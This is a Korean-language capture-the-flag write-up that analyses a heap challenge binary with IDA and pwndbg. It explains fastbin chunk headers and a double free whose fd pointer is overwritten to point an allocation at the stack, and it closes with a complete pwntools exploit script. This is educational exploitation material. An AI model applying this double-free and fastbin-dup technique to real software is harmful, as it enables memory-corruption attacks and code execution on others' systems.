# Malloc 

이번에 올리는 라이트업은 무려 힙 오버플로우이다. 새벽 4시부터 시작해서 밤 11시까지 매달려서 풀었다.
이번에는 gdb peda가 아닌 pwndbg를 사용하였다. 처음에는 사용법을 잘 몰라서 헤매었는데 동아리 회장님의 도움을 받아 금방 터득할 수 있었다.

문제를 접하기 2주 정도 전에 동기에게서 간단한 힙 오버플로우에 대한 설명을 들었던 기억이 있다. fastbin이라는 놈인데 아주 작은 크기의 힙들은 대부분 이놈과 관련된 문제라고 얼핏 들었었다. 그래서 ida로 가장 먼저 확인한 것이 malloc의 크기를 얼마까지 할당할 수 있는지였다.

문제는 아웃라인은 간단했다. 5가지의 옵션이 있었는데,

1. malloc
2. free
3. list
4. modify
5. exit

였다. 그래서 ida로 하나씩 까보았다.

![input](http://cfile9.uf.tistory.com/image/992F7B3E5A43C72B2C111D)

가장 먼저 1. malloc을 까보았는데, 크기는 32바이트 이하일 경우는 그대로 할당을 해주고, 32바이트 이상의 크기를 입력한 경우에는 It's too big 메시지를 호출하고 32바이트 크기의 힙을 할당해 주는데, 이 놈이 바로 fastbin이라는 놈이 되겠다.

![input](http://cfile4.uf.tistory.com/image/990F433E5A43C72C107BB8)

2. free란 놈을 보니, 아래와 같이 그냥 free를 해준다. 여기서 버그가 빵빵 터질것 같았다.

![input](http://cfile4.uf.tistory.com/image/994FAD3E5A43C72C09EE4E)

3.list는 간단하게 heap에 저장된 데이터를 보여주고, 

![input](http://cfile25.uf.tistory.com/image/9930CD3E5A43C72D2B93F0)

4. modify는 데이터의 내용을 바꿔주는 놈 인것 같다. 바로 요놈이 이 문제의 핵심이리라 감이 왔다.

![input](http://cfile21.uf.tistory.com/image/9990DF3E5A43C72E207EA0)

머 좀더 뒤져보니까 아래와 같이 /bin/cat을 실행시키는 명령어의 주소값도 얻을 수 있었다. 시스템 libc를 딸 필요가 없을 것 같다.

![input](http://cfile2.uf.tistory.com/image/9978BF3E5A43C72F2430A0)

밑에 참고한 사이트를 보면 자세히 설명이 되어 있겠지만, 간단하게 설명을 하자면 malloc이 되면 사이즈보다 더 큰 메모리 값이 할당이 된다. 이게 무슨 말이냐면 우리가 32바이트의 크기로 malloc을 하더라도 chunk header라는 것이 추가되기 때문에 좀 더 큰 사이즈의 값이 할당이 된다. 요 header라는 놈에는 prev_size, chunk_size라는 놈들이 존재하는데 전자는 free된 경우라면 이전 청크의 크기를 저장하고 후자는 헤더를 포함한 크기를 나타낸다. 즉, mallocdmfh 0x20바이트 만큼을 할당하게 되면 0x28 만큼이 할당되는 이유가 되는데 물론 시스템이 몇 bit냐에 따라 다르다.

만약 이 메모리 영역이 free가 되면 *fd와 *bk에 대한 정보가 추가가 되는데 forward pointer to next chunk in list와 back pointer to previous chunk in list가 이들이다. fastbin의 경우 *fd만 사용한다고들 하는데, 이 fd라는 놈은 첫 free되었을 경우에는 추가가 되지 않는다. 다만 2번째 free가 발생하게 되면 첫 free한 놈의 첫 주소값이 fd에 저장된다. 이는 아래에서 한번 더 설명하도록 하겠다. 여기서 말하고자 하는 것은 링크드 리스트 형태로 청크들이 관리가 된다는 것이다. 

프로그램을 디버깅 하기 전에 bp를 걸어야하지 않겠는가? 

아래와 같이 각 옵션들의 ret에 bp를 걸었다.

![input](http://cfile9.uf.tistory.com/image/992C523E5A43C72F0F15F5)

1번 옵션을 선택하고 32바이트 만큼을 할당하고 값으로는 'A'를 넣어보았다.
그리고 heap 명령어를 사용하여 확인해 보았는데,

![input](http://cfile26.uf.tistory.com/image/99B0273E5A43C7301D7130)

0xbbb410 이라는 주소에 fastbin이 생성되었고, 49의 크기를 가지고 있었다. 이게 아까 말한 chunk header가 추가되었기 때문인데, 64bit여서 32+16만큼의 크기가 할당이 되고, prev inuse라는 1크기가 추가되었기 때문이다. (이 1바이트는 이전 청크가 프리되면 0으로 바뀐다고 한다.)

힙이 할당된 주소값을 찾아가보니까,

![input](http://cfile21.uf.tistory.com/image/99C20F365A43C73029CAFD)

0x31만큼의 크기가 할당이 되었다는 것과, 41 'A'값이 들어간 것을 확인할 수 있었다.

다시 한번 더 malloc을 해보도록 하겠다.

![input](http://cfile7.uf.tistory.com/image/99E8E4365A43C731244213)

똑같이 32바이트로 할당을 하였고 값으로 'B'를 넣어보았다. 그리고 주소값을 찾아가보았더니,

![input](http://cfile28.uf.tistory.com/image/99BAD5365A43C7322A160E)

첫 할당 부분 뒤에 가지런히 붙어서 할당된 것을 확인할 수 있었다.

이제 fastbin의 취약점으로 공격을 할 준비가 다 되었다. 
위에서 설명했듯이 fastbin의 경우 같은 크기의 힙이 free가 되면 *fd를 통하여 청크들이 링크드리스트 형태로 관리가 된다. 여기서 취약점이 발생하는데 이름하여 double free이다.

2번 옵션을 통하여 2번째 malloc 한 부분을 free를 하고 힙을 까보았더니,

![input](http://cfile3.uf.tistory.com/image/997BFC365A43C732336E11)

42가 날라갔다. 무사히 free가 되었다는 것을 알 수 있다. 

그렇다면 이번에는 젤 처음에 malloc을 한 0xbbb410부분을 free해보도록 하자.

![input](http://cfile28.uf.tistory.com/image/996B8D365A43C73335F9A2)

??? 데이터 부분에 0x00bbb440이라는 부분이 추가 된 것을 확인할 수 있다. 이 놈이 바로 그 청크이다. 그 전에 free한 같은 크기의 힙의 시작주소를 뜻하는데, 이놈이 이렇게 저장되는 것이다. 여기서 생각할 수 있는 것이, 저 놈의 값만 조작할 수 있으면 원하는 명령어를 실행시킬 수 있을까 하는 것이다.

그래서 4번 modify라는 놈을 활용해보기로 하였다. 이 놈을 통하여 첫 malloc 힙 부분의 값에 'AAAA'를 넣어보았더니!

![input](http://cfile9.uf.tistory.com/image/9988AF365A43C733310700)

청크 주소값이 오버라이트 되었다. 그렇다! 바로 이 modify라는 놈을 활용하여 이 주소값을 임의로 조작할 수 있게 된 것이다.

![input](http://cfile22.uf.tistory.com/image/99BA07365A43C73406A8B4)

여기서 놓치고 간 부분이 있었다. 바로 프로그램이 실행될 때 아래와 같이 Stack Address를 알려준다는 것이다.
이 주소값을 스택으로 돌리면 된다는 힌트를 아주 직접적으로 주고 있었다

![input](http://cfile7.uf.tistory.com/image/996C723E5A43C73605AD27)

how2heap의 fastbin_dup_into_stack이라는 문제와 아주 비슷한 모습을 띄고 있었다.

바로 이어서 malloc을 해보겠다. 32바이트의 크기로 힙을 할당해보았더니,

![input](http://cfile30.uf.tistory.com/image/993C613E5A43C7340DC069)

아래와 같이 힙의 데이터부분이 오버라이트 되었다.

![input](http://cfile26.uf.tistory.com/image/99C5C13E5A43C7351A0E35)

한번 더 malloc을 해보았더니, 버그가 빵하고 터진다. 아마 chunk의 주소값이 올바르지 않기 때문일 것이다. 

![input](http://cfile5.uf.tistory.com/image/99F8BB3E5A43C73534A793)

heap의 청크 주소값을 스택의 주소값으로 변경을 하면 malloc시 스택에 할당 받게 될 것이다.

처음에 노출된 스택의 주소값을 따라가보았는데, 아래와 같았다.

![input](http://cfile28.uf.tistory.com/image/99A2A23E5A43C7371E2884)

스택을 조금 거슬러 올라가보니, 힙과 상당히 비슷하게 보이는 부분을 찾을 수 있었다.

![input](http://cfile22.uf.tistory.com/image/99F3BE3E5A43C7373491C3)

이 부분에서 오버플로우를 발생시켜 EIP의 주소를 /bin/cat을 실행시켜주는 함수의 주소로 바꾸면 공격에 성공할 것이다.



전체적인 exploit이다.

```python
from pwn import *
 
print("-------------------")
print("------malloc-------")
print("--pwned by pwnWiz--")
print("-------------------")
print("\n")
 
 
context.log_level='debug'
 
binary='./malloc'
s=process('./malloc')
e=ELF(binary)
 
log.info("malloc Loaded..")
 
shellcode=0x400986 #/bin/cat
 
 
def malloc():
    for i in range(2):
        log.info("1.malloc Loaded..")
        s.sendline("1")
        print s.recvuntil(":")
        s.sendline("32")
        log.info("32\n")
        print s.recvuntil(":")
        s.sendline("A")
        log.info("A\n")
        print s.recv(1024)
        print s.recv(1024)
 
def free():
        log.info("2.free Loaded..")
        s.sendline("2")
        print s.recvuntil(":")
        s.sendline("2")
        log.info("2\n")
        print s.recv(1024)
        print s.recv(1024)
        log.info("2.list again Loaded for double free..")
        s.sendline("2")
        print s.recvuntil(":")
        s.sendline("1")
        log.info("1\n")
        print s.recv(1024)
        print s.recv(1024)
        
def list():
    log.info("3.list Loaded..")
    s.sendline("3")
    print s.recvuntil(":")
 
def modify():
    log.info("4.modify Loaded..")
    s.sendline("4")
    print s.recvuntil(":")
    s.sendline("1")
    log.info("1\n")
    print s.recvuntil(":")
    s.sendline(p64(stack-0x58))
    
def exit():
    log.info("5.exit Loaded..")
    s.sendline("5")
 
def exp():
    log.info("1.malloc Loaded to exploit :<")
    s.sendline("1")
    print s.recvuntil(":")
    s.sendline("32")
    log.info("32\n")
    print s.recvuntil(":")
    s.sendline("A"*32)
    log.info("A*32")
    s.recv(1024)
    s.recv(1024)
    log.info("1.malloc Loaded to exploit :<")
    s.sendline("1")
    print s.recvuntil(":")
    s.sendline("49")
    log.info("49\n")
    print s.recvuntil(":")
    s.sendline("A"*24+p64(shellcode))
 
s.recvuntil(":")
stack=int(s.recvuntil("\n"),16)
#print("stack address : "+ stack)
print s.recv(1024)
sleep(1)
malloc() # allocate 1st, 2nd memory chunk with size 32
free()  # free 2nd, 1st
modify() # stack-0x58 insert
exp()
s.interactive()
```


heap 취약점 : https://bpsecblog.wordpress.com/2016/10/06/heap_vuln/

malloc chunk : https://blog.naver.com/yheekeun/220908609921

heap control : https://bpsecblog.wordpress.com/2016/08/31/translate_fastbin/

fastbin : https://blog.naver.com/yheekeun/220909203505

double free : https://blog.naver.com/best0937/220923280008

fastbin_dup_in_stack : https://blog.naver.com/best0937/220926739258
